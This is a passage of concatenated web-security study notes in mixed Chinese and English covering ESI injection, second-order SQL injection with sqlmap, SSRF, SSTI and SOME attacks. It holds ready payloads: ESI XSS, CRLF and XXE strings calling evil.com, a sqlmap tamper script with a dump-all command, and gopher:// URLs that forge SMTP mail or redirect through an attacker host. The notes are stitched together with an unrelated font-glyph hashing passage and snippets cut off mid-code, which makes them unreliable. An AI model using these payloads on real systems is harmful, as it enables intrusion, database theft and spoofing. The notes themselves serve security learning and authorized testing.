Cookie 123456# This will reflect the cookies in the response# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)# It's possible to put more complex JS code to steal cookies or perform actions # 7. Private Local File 1<esi:include src="secret.txt"> # 8. CRLF 1<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/> # 9. Add Header 123<esi:include src="http://example.com/asdasd"><esi:request_header name="User-Agent" value="12345"/></esi:include> # 10. Add Header 1# Check the number of url_decode to know how many times you can URL encode the value # 11. CRLF in Add header (CVE-2019-2438) 1234<esi:include src="http://example.com/asdasd"><esi:request_header name="User-Agent" value="12345Host: anotherhost.com"/></esi:include> # 12. Akamai debug 1<esi:debug/> # 13. ESI + XSLT = XXE 1<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" /> # 14. ESI + XSLT = XXE 123<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]><foo>&xxe;</foo> # 工具与参考入口 Apache docs GoSecure created https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 XSS 跨站脚本 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/Second Order Injection with SQLMap 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Second Order Injection with SQLMap 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Second Order Injection with SQLMap 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Second Order Injection with SQLMap 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Second Order Injection with SQLMap、Useful switches in real second-order flows、When --tamper is not enough、Important limitations；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Second Order Injection with SQLMap Useful switches in real second-order flows When --tamper is not enough Important limitations # 核心要点 SQLMap can 利用 Second Order SQLis.\ The request where the sqlinjection 载荷 is going to be saved The request where the 载荷 will be executed In several cases this won't be enough because you will need to perform other actions apart from sending the 载荷 and accessing a different page. When this is needed you can use a sqlmap tamper. For example the following script will register a new user using sqlmap 载荷 as email and logout. A SQLMap tamper is always executed before starting a injection try with a 载荷 and it has to return a 载荷. In this case we don't care about the 载荷 but we care about sending some requests, so the 载荷 isn't changed. Create an account with the SQL 注入 载荷 inside the "email" field Send a request to execute the SQL 注入 (second.txt) --CSRF - 令牌，--CSRF-url, --CSRF-method: Useful when the store or trigger request needs a fresh anti-CSRF 令牌 on every attempt. Do not assume that --second-req will replay the same 载荷 inside a * placeholder in the second request. If the trigger request also needs the injected value (or a derived version of it), a custom tamper, --preprocess, or a local proxy is usually required. Workflow state that is only executed after a preview, export, or moderation action # 命令 / 载荷 / 操作片段 # 1. Second Order Injection with SQLMap 12345#Get the SQL payload execution with a GET to a urlsqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"#Get the SQL payload execution sending a custom request from a filesqlmap -r login.txt -p username --second-req details.txt # 2. Second Order Injection with SQLMap 12345678910111213141516171819202122232425#!/usr/bin/env pythonimport reimport requestsfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef login_account(payload): proxies = {'http':'http://127.0.0.1:8080'} cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"} params = {"username":"asdasdasd", "email":payload, "password":"11111111"} url = "http://10.10.10.10/create.php" pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies) url = "http://10.10.10.10/exit.php" pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)def tamper(payload, **kwargs): headers = kwargs.get("headers", {}) login_account(payload) return payload # 3. Second Order Injection with SQLMap 123456789101112sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a########### --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload# -r login.txt : Indicates the request to send the SQLi payload# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt# --second-req second.txt : Request to send to execute the SQLi and get the ouput# --proxy http://127.0.0.1:8080 : Use this proxy# --technique=U : Help sqlmap indicating the technique to use# --dbms mysql : Help sqlmap indicating the dbms# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln# -a : Dump all # 4. Useful switches in real second-order flows 12345678910sqlmap -r login.txt -p email \ --second-req second.txt \ --csrf-token csrf \ --csrf-url https://target.tld/profile \ --csrf-method POST \ --live-cookies cookies.txt \ --safe-req keepalive.txt \ --safe-freq 1 \ --string "Welcome back" \ --text-only # 5. When --tamper is not enough 1234#!/usr/bin/env pythondef preprocess(req): if req.data: req.data += b"&preview=1" # 6. When --tamper is not enough 12345#!/usr/bin/env pythonimport redef postprocess(page, headers=None, code=None): page = re.sub(br"<span>Generated at .*?</span>", b"", page or b"") return page, headers, code # 工具与参考入口

Treat the 哈希 as a stable ID: the same visual shape across requests collapses to the same perceptual 哈希，defeating randomized IDs. 下载 the target TTF/OTF fonts (e.g., Bookerly normal/italic/bold/bold-italic). Normalize all images to the same size and grayscale before hashing and SSIM. Cache by perceptual 哈希 to avoid recomputing SSIM for repeated glyphs across batches. Alignment: Group by similar left X for left-aligned paragraphs; detect centered lines by symmetric margins; detect right-aligned by right edges. Use filled paths with fill-rule: nonzero and a proper renderer (CairoSVG, resvg). Do not rely on path 令牌 normalization. In practice, books converge to a few hundred unique glyphs (e.g., ~361 including ligatures). Cache SSIM results by perceptual 哈希. After initial discovery, future batches predominantly re-use known hashes; decoding becomes I/O-bound. # 命令 / 载荷 / 操作片段 # 1. This 漏洞 can be found in various technologies, including Jinja. Jinja is a popular template engine used in web applications. Let's consider an example that demonstrates a vulnerable code snippet using Jinja: In this vulnerable code, the name parameter from the user's request is directly passed into the template using the render function. This can potentially allow an attacker to inject malicious code into the name parameter, leading to server-side template injection. For instance, an attacker could craft a request with a 载荷 like this: The 载荷 {{bad-stuff-here}} is injected into the name parameter. This 载荷 can contain Jinja template directives that enable the attacker to execute unauthorized code or manipulate the template engine, potentially gaining control over the server. Thrown errors, revealing the 漏洞 and potentially the template engine. Absence of the 载荷 in the reflection, or parts of it missing, implying the server processes it differently than regular data. Code Context: Confirm 漏洞 by altering input parameters. For instance, changing greeting in http://vulnerable-website.com/?greeting=data.username to see if the server's output is dynamic or fixed, like in greeting=data.username}}hello returning the username. title: SSRF 技术笔记
content:
来源路径： 02-知识点/Web安全/SSRF 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SSRF 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 SSRF 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 SSRF 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：SSRF、SSRF 简介、SSRF 漏洞出现的场景、常用的后端实现、阻碍 SSRF 漏洞利用的场景；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SSRF SSRF 简介 SSRF 漏洞出现的场景 常用的后端实现 阻碍 SSRF 漏洞利用的场景 利用 SSRF 进行端口扫描 协议利用 绕过姿势 危害 参考资料 # 核心要点 SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。 攻击者可以利用 SSRF 实现的攻击主要有 5 种： 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息 攻击运行在内网或本地的应用程序（比如溢出） 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 从远程服务器请求资源（上传 from URL，Import & Export RSS Feed） 服务器开启 OpenSSL 无法进行交互利用 服务端需要鉴权（Cookies & User：Pass）不能完美利用 可以指向任意 ip 的域名 xip.io：http://127.0.0.1.xip.io/==>http://127.0.0.1/ 利用句号。：127。0。0。1==>127.0.0.1 利用 Enclosed alphanumerics 腾讯某处 SSRF 漏洞（非常好的利用点）附利用脚本 bilibili 某分站从信息泄露到 SSRF 再到命令执行 # 命令 / 载荷 / 操作片段 # 1. 常用的后端实现 12345678910<?php if (isset($_POST['url'])) { $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = "<img src=\"".$filename."\"/>"; } echo $img; ?> # 2. 常用的后端实现 1234567891011121314151617181920<?php function GetFile($host,$port,$link) { $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) { echo "$errstr (error number $errno) 
"; } else { $out = "GET $link HTTP/1.1
"; $out .= "Host: $host
"; $out .= "Connection: Close

"; $out .= "
"; fwrite($fp, $out); $contents=''; while (!feof($fp)) { $contents.= fgets($fp, 1024); } fclose($fp); return $contents; } } ?> # 3. 常用的后端实现 123456789101112131415<?php if (isset($_POST['url'])) { $link = $_POST['url']; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = './curled/'.rand().'.txt'; file_put_contents($filename, $result); echo $result; } ?> # 4. 利用 SSRF 进行端口扫描 1234567891011121314151617<?phpif (isset($_POST['url'])) { $link = $_POST['url']; $filename = './curled/'.rand().'txt'; $curlobj = curl_init($link); $fp = fopen($filename,"w"); curl_setopt($curlobj, CURLOPT_FILE, $fp); curl_setopt($curlobj, CURLOPT_HEADER, 0); curl_exec($curlobj); curl_close($curlobj); fclose($fp); $fp = fopen($filename,"r"); Memcached communicates over port 11211 by default. content: 来源路径： 02-知识点/Web安全/SSRF (服务端请求伪造 SSRF).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SSRF (服务端请求伪造 SSRF) [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 SSRF (服务端请求伪造 SSRF) 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 SSRF (服务端请求伪造 SSRF) 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Basic Information、Capture SSRF、Whitelisted Domains 绕过、绕过 via 开放重定向、Protocols；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 19 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Basic Information Capture SSRF Whitelisted Domains 绕过 绕过 via 开放重定向 Protocols Gopher:// Gopher MongoDB -- Create user with username=admin with 密码 = admin123 and with permission=administrator SSRF via Referrer header & Others SSRF via SNI data from certificate SSRF via TLS AIA CA Issuers (Java mTLS) SSRF via CSS Pre-Processors Wget file 上传 SSRF with 命令注入 PDFs Rendering From SSRF to DoS SSRF PHP Functions SSRF Redirect to Gopher Misconfigured proxies to SSRF # 核心要点 A Server-side Request Forgery (SSRF) 漏洞 occurs when an attacker manipulates a server-side application into making HTTP requests to a domain of their choice. This 漏洞 exposes the server to arbitrary external requests directed by the attacker. Usually you will find that the SSRF is only working in certain whitelisted domains or URL. In the following page you have a compilation of techniques to try to 绕过 that whitelist: url-format - 绕过.md Read more here: https://portswigger.net/web-security/SSRF Identified as a protocol for secure file transfer over secure shell, an example is provided showcasing how a PHP script could be exploited to connect to a malicious SFTP server: url=sftp://generic.com:11111/ A method is described for exploiting SSRF vulnerabilities to interact with SMTP services on localhost, including steps to reveal internal domain names and further investigative actions based on that information. Curl URL globbing：WAF 绕过 If the SSRF is executed by curl, curl has a feature called URL globbing that could be useful to 绕过 WAFs. For example in this writeup you can find this example for a 路径穿越 via file protocol: The Gopher protocol's capability to specify IP, port, and bytes for server communication is discussed, alongside 工具 like Gopherus and remote-method-guesser for crafting 载荷. Two distinct uses are illustrated: Requirements: mTLS enabled, Java AIA fetching enabled, attacker can present a client cert with a crafted AIA CA Issuers URI. DoS via file://: setting AIA CA Issuers to file:///dev/urandom on Unix-like hosts makes Java treat it as a CertStore and read unbounded random bytes, keeping a CPU core busy and blocking subsequent connections even after the client disconnects. Full response returned: responses from internal hosts are streamed back, so you can enumerate and interact (e.g., SOAP/Axis2, Keycloak, admin consoles) rather than blind-probing. Abuse as pivot: combine with other vulns (e.g., 上传 endpoints) to reach intra-host services. Singularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack 载荷 to 利用 vulnerable software on the target machine. # 命令 / 载荷 / 操作片段 # 1. Protocols 12345From https://twitter.com/har1sec/status/11822559520551649291. connect with SSRF on smtp localhost:252. from the first line get the internal domain name 220 http://blabla.internaldomain.com ESMTP Sendmail3. search http://internaldomain.com on github, find subdomains4. connect # 2. Protocols 1file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt} # 3. Gopher:// 123456789101112ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250awill make a request likeHELO localhostMAIL FROM:<hacker@site.com>RCPT TO:<victim@site.com>DATAFrom: [Hacker] <hacker@site.com>To: <victime@site.com>Date: Tue, 15 Sep 2017 17:20:26 -0400Subject: Ah Ah AHYou didn't say the magic word !.QUIT # 4. Gopher:// 123#For new lines you can use %0A, %0D%0Agopher://<server>:8080/_GET / HTTP/1.0%0A%0Agopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body # 5. Gopher:// 1234<?phpheader("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");?>Now query it.https://example.com/?q=http://evil.com/redirect.php. # 6. Each letter corresponds to a different class of 载荷: If you found a SQL 注入 but sqlmap didn't detect it, you can force the 检测 technique with args like --prefix or --suffix, or if more complex, adding it to the paylaods used by sqlmap in /usr/share/sqlmap/data/xml/ 载荷 /time blind.xml for example for time blind based. Read this post about how to perform simple and complex second order injections with sqlmap. Remember that you can create your own tamper in python and it's very simple. For example, in the case where you can control a callback value that will be executed. In those case, one of the best things that you could do is to access the DOM to call whatever sensitive action you can find in there (like clicking a button). However, usually you will find this 漏洞 in small endpoints without any interesting thing in the DOM. In those scenarios, this attack will be very useful, because its goal is to be able to abuse the limited JS execution inside a DOM from a different page from the same domain with much interesting actions. Basically, the attack flow is the following: If it's not limited and you can execute any JS, you could just abuse this as a regular XSS Make the victim open a page controlled by the attacker The second page will load the vulnerable page abusing the callback and using the opener object to access and execute some action in the initial page (which now contains the interesting DOM). You can use this form to generate a PoC to 利用 this type of 漏洞: https://www.someattack.com/Playground/SOMEGenerator In order to find a DOM path to a HTML element with a click you can use this browser extension: https://www.someattack.com/Playground/targeting tool You can find a vulnerable example in https://www.someattack.com/Playground/ Also check this CTF writeup: https://ctftime.org/writeup/36068 # 工具与参考入口 https://www.someattack.com/Playground/SOMEGenerator https://www.someattack.com/Playground/targeting tool https://www.someattack.com/Playground/ https://ctftime.org/writeup/36068 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
